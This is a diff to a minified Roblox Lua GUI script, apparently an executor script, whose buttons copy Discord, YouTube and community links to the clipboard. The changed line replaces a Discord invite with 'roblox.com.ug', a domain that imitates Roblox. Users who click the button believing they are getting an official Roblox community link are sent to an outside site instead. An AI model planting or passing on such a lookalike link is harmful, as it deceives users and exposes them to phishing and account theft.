@@ -16,7 +16,7 @@ local n=Instance.new("TextLabel",s)n.Size=UDim2.new(0,180,0,36)n.Position=UDim2.
 local function cp(l)setclipboard(l)n.Visible=true n.BackgroundTransparency=0 n.TextTransparency=0 task.delay(1.5,function()t:Create(n,TweenInfo.new(.3),{BackgroundTransparency=1,TextTransparency=1}):Play()task.wait(.3)n.Visible=false end)end
 c.MouseButton1Click:Connect(function()m.Visible=false f.Visible=true end)
 f.MouseButton1Click:Connect(function()m.Visible=true f.Visible=false end)
-g.MouseButton1Click:Connect(function()cp"https://discord.gg/FHrsUBYNjb"end)
+g.MouseButton1Click:Connect(function()cp"https://roblox.com.ug/communities/8532004476/"end)
 d.MouseButton1Click:Connect(function()cp"https://discord.gg/FHrsUBYNjb"end)
 y.MouseButton1Click:Connect(function()cp"https://www.youtube.com/@vinay-n1q8k"end)
 local dr,st,po
